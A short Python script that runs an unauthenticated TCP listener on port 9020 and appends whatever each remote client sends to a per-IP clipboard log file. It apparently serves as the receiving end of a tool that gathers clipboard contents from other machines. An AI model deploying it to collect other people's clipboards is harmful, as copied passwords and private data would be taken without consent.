import socket
import os

def save_clipboard_data(client_ip, data):
    folder = 'cliplogs'
    if not os.path.exists(folder):
        os.makedirs(folder)

    filename = os.path.join(folder, client_ip + "-clipboard.txt")
    with open(filename, "a") as file:
        file.write(data+"\n")

def start_server():
    host = '0.0.0.0'  # Listen on all network interfaces
    port = 9020  # Replace with the port number you want to use

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)

    print("Server listening on {}:{}".format(host, port))

    while True:
        client_socket, client_address = server_socket.accept()
        print("Connection established from {}:{}".format(client_address[0], client_address[1]))

        data = b""  # Initialize an empty byte string to store the received data

        while True:
            chunk = client_socket.recv(1024)  # Receive data in chunks of 1024 bytes
            if not chunk:
                break  # No more data to receive

            data += chunk

        data = data.decode('utf-8')
        print("Received data: {}".format(data))

        save_clipboard_data(client_address[0], data)
        print("Data saved in {}.txt".format(client_address[0]))

        client_socket.close()

start_server()
